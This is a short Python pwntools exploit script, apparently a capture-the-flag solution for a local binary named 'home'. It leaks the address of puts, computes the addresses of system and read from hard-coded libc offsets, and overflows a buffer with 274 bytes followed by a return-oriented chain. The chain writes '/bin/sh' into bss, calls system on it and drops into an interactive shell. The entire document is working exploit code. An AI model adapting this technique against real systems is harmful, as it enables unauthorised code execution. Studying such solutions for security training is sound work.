from pwn import *

system_offset = -0x2c4a0
read_offset = +0x83f30
pppr = 0x8048589
bss = 0x08049864

p = process('./home')
p.sendline('a')

p.recvuntil(' Also I ')
puts_addr = int(p.recv(8), 16)
system_addr = puts_addr + system_offset
read_addr = puts_addr + read_offset

log.info('puts address = 0x%x' % puts_addr)
log.info('read address = 0x%x' % read_addr)
log.info('system address = 0x%x' % system_addr)

p.recvuntil('you.')
payload = b'a'*274
payload += p32(read_addr) + p32(pppr) + p32(0) + p32(bss) + p32(8) + p32(system_addr) + b"aaaa" + p32(bss)
p.sendline(payload)
p.recvline()
p.send('/bin/sh\x00')

p.interactive()
